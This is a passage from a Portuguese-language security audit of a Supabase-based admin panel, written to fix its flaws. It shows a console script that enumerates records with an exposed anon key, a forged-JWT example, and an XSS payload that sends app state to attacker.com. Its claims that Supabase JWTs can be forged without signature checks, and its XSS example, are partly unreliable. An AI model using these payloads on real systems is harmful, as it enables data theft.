# ANÁLISE DETALHADA: SEGURANÇA E VULNERABILIDADES
## SUB INFRA PANEL v1.0.6

**Documento**: Análise de segurança, vulnerabilidades e mitigações  
**Data**: Março 2026  
**Crítico**: 3 issues, Alto: 5 issues, Médio: 7 issues

---

## 1. VULNERABILIDADES CRÍTICAS

### 1.1 RBAC Quebrado para "convidado"

**Localização**: `2026_script.js`, linhas 1340-1350

**Problema:**
```javascript
// Código atual (BUGADO)
window.updateUserInfo = function() {
  const userRole = window.userRole;
  
  // Menu admin
  const adminMenu = document.getElementById('adminMenu');
  if (userRole === 'administrador') {
    adminMenu.style.display = 'block'; // ✅ Funciona
  }
  
  // Menu operador
  const operadorMenu = document.getElementById('operadorMenu');
  if (userRole === 'operador') {
    operadorMenu.style.display = 'block'; // ✅ Funciona
  }
  
  // ❌ BUG: Sem else para 'convidado'!
  // Logo convidado vê todos os menus por padrão
};
```

**Impacto:**
- CSS `display: block` persiste do HTML original
- Se `userRole !== 'administrador'` E `userRole !== 'operador'`, os menus não mudam
- Convidado vê botões de admin (mas RLS protege backend)

**Prova do Bug:**
```html
<!-- index.html (padrão) -->
<div id="adminMenu" style="display: block;">
  <!-- Menus visíveis por padrão -->
</div>
```

```javascript
// updateUserInfo() com userRole = 'convidado'
// if (userRole === 'administrador') → FALSE, não entra
// if (userRole === 'operador') → FALSE, não entra
// adminMenu mantém display: block (VULNERABILIDADE!)
```

**Solução:**
```javascript
window.updateUserInfo = function() {
  const userRole = window.userRole;
  const adminMenu = document.getElementById('adminMenu');
  const operadorMenu = document.getElementById('operadorMenu');
  const convidadoMenu = document.getElementById('convidadoMenu');
  
  // Esconder todos primeiro
  adminMenu.style.display = 'none';
  operadorMenu.style.display = 'none';
  convidadoMenu.style.display = 'none';
  
  // Mostrar apenas o correto
  if (userRole === 'administrador') {
    adminMenu.style.display = 'block';
  } else if (userRole === 'operador') {
    operadorMenu.style.display = 'block';
  } else if (userRole === 'convidado') {
    convidadoMenu.style.display = 'block';
  } else {
    // Sem role atribuída - logout
    handleLogout();
  }
};
```

**Teste para validar:**
```html
<!-- Adicionar ao index.html para teste -->
<div style="position: fixed; top: 10px; right: 10px; background: red; color: white; padding: 10px;">
  Role: <span id="testRole">carregando...</span>
  Admin visível: <span id="testAdminVis">?</span>
  Operador visível: <span id="testOpVis">?</span>
</div>

<script>
setInterval(() => {
  document.getElementById('testRole').textContent = window.userRole;
  document.getElementById('testAdminVis').textContent = 
    getComputedStyle(document.getElementById('adminMenu')).display;
  document.getElementById('testOpVis').textContent = 
    getComputedStyle(document.getElementById('operadorMenu')).display;
}, 1000);
</script>
```

---

### 1.2 Anon Key Exposta + Sem Rate Limiting

**Localização**: `2026_script.js`, linhas 1-50 + `index.html`, linhas 1-100

**Problema:**
```javascript
// 2026_script.js - Hardcoded
const SUPABASE_URL = 'https://your-project.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3M...';
```

**Por que é perigoso:**
```
1. Token visível no source code
2. Qualquer pessoa pode chamar sua API Supabase
3. Sem rate limiting, possível DoS
4. Consultas complexas podem expor dados via RLS bypass
```

**Ataque possível:**
```javascript
// Em console do browser de qualquer pessoa
const supabase = window.supabase.createClient(
  'https://your-project.supabase.co',
  'eyJhbGc...' // Token visto no source
);

// Tentar extrair dados
for (let i = 1; i < 10000; i++) {
  supabase.from('processes').select('*').eq('id', i).then(r => {
    if (r.data?.length > 0) {
      console.log('Found process:', r.data);
    }
  });
}
```

**Mitigação 1: Rate Limiting no Supabase**
```sql
-- Criar policy com rate limit (sem suporte nativo)
-- Usar Supabase "Secrets" para key em vez de hardcode
```

**Mitigação 2: Backend Proxy**
```javascript
// Em vez de chamar Supabase diretamente do frontend,
// usar backend (Node/Python) como proxy

// Frontend
const response = await fetch('/api/processes', {
  method: 'GET',
  headers: { 'Authorization': `Bearer ${authToken}` }
});

// Backend (Node)
app.get('/api/processes', authMiddleware, async (req, res) => {
  const { data, error } = await supabase
    .from('processes')
    .select('*');
  
  // Validar resultado antes de enviar
  res.json(data);
});
```

**Mitigação 3: JWT Com Expiração**
```javascript
// Implementar refresh token rotation
supabase.auth.onAuthStateChange((event, session) => {
  if (session) {
    // JWT expira em 1 hora por padrão
    console.log('Token expires at:', new Date(session.expires_at * 1000));
  }
});
```

---

### 1.3 Super-Admin Email Hardcoded em SQL

**Localização**: `supabase_schema.sql`, linhas 157-160

**Problema:**
```sql
CREATE OR REPLACE FUNCTION is_super_admin()
RETURNS BOOLEAN AS $$
BEGIN
  -- ❌ Email hardcoded!
  RETURN auth.jwt() ->> 'email' = 'cpdinfra@edu.itaguai.rj.gov.br';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

**Por que é crítico:**
1. Se um attacker conseguir JWT de qualquer usuário autenticado
2. Pode clonar JWT e mudar o email claim
3. Func SQL executa e retorna TRUE (com ferramentas como jwt.io)
4. Resultado: acesso admin total

**Ataque prático:**
```javascript
// jwt.io permite editar claims visualmente
const fakeJWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImNwZGluZnJhQGVkdS5pdGFndWFpLnJqLmdvdi5iciJ9...';

// Usar este token para chamar is_super_admin()
// Sem validação de signature, qualquer pessoa pode forjar!
```

**Correção:**
```sql
-- Opção 1: Tabela de super admins
CREATE TABLE super_admins (
  id UUID PRIMARY KEY REFERENCES auth.users(id),
  email VARCHAR(255),
  added_by UUID REFERENCES auth.users(id),
  added_at TIMESTAMP DEFAULT NOW()
);

INSERT INTO super_admins (id, email) 
SELECT id, email FROM auth.users WHERE email = 'cpdinfra@edu.itaguai.rj.gov.br';

CREATE OR REPLACE FUNCTION is_super_admin()
RETURNS BOOLEAN AS $$
BEGIN
  RETURN EXISTS (
    SELECT 1 FROM super_admins WHERE id = auth.uid()
  );
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Opção 2: Usar Supabase admin CLI para marcar
-- supabase roles create super_admin --description "Super Administrator"
```

---

## 2. VULNERABILIDADES ALTAS

### 2.1 XSS via Inline onclick em Tabelas

**Localização**: `2026_script.js`, linhas 583-645 e `index.html`

**Problema:**
```javascript
// Renderizar botões com inline onclick
row.innerHTML = `
  <td>${process.id}</td>
  <td>${process.name}</td>
  <td>
    <button onclick="editProcess(${process.id})">Editar</button>
    <button onclick="deleteProcess(${process.id})">Deletar</button>
  </td>
`;
```

**Ataque se dados vierem de fonte não confiável:**
```javascript
// Se um supplier tiver nome: `"); alert('XSS Explorado!'); //`
// HTML resultante:
<td>
  <button onclick="deleteProcess(123); alert('XSS Explorado!'); //)">Deletar</button>
</td>

// Quando clica, XSS dispara!
```

**Mesmo com dados do BD (confiáveis), problema de manutenção:**
```javascript
// Se mudar estrutura de dados, fácil esquecer de escapar
const maliciousData = { id: 123, name: 'Test\');\n fetch("http://attacker.com/steal?data=" + btoa(JSON.stringify(window.state))) //'}
// Risco de supply chain attack se BD for comprometida
```

**Solução: Event Delegation + data attributes**
```javascript
// Renderização limpa
const row = document.createElement('tr');

const tdId = document.createElement('td');
tdId.textContent = process.id;

const tdName = document.createElement('td');
tdName.textContent = process.name;

const tdActions = document.createElement('td');
const editBtn = document.createElement('button');
editBtn.textContent = 'Editar';
editBtn.dataset.processId = process.id; // data-process-id
editBtn.dataset.action = 'edit';

const deleteBtn = document.createElement('button');
deleteBtn.text
